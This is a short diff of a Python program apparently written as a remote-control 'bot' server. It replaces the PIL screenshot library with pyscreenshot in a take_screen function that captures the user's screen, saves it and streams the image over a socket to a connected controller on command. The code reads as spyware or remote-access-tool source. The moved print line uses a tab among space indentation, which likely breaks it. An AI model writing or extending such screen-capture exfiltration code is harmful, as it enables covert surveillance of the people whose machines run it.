@@ -5,7 +5,7 @@ import sys
 from uuid import getnode as get_mac
 import subprocess
 from subprocess import call
-import PIL.ImageGrab
+import pyscreenshot as ImageGrab
 import datetime
 
 # ---------- BOT INIT ---------- #
@@ -220,16 +220,16 @@ def take_screen(the_client):
     d1 = datetime.datetime.now().strftime("%Y%M%d %H%M%S")
 
     print(d1)
-    img = PIL.ImageGrab.grab()
+    img = ImageGrab.grab()
     img.save(str(str(d1) + '.png'), 'png')
 
     the_client.send('[*-->ok')
     if the_client.recv(1024) == '[*-->start':
         the_file = open(('%s.png' % d1), 'rb')
         file_stream = the_file.read(1024)
-
+	print('Sending...')
         while file_stream:
-            print('Sending...')
+            
             the_client.send(file_stream)
             file_stream = the_file.read(1024)
 
@@ -282,6 +282,3 @@ while True:
     client_handler.start()
 
 # ---------- END OF SERVER ---------- #
-
-
-
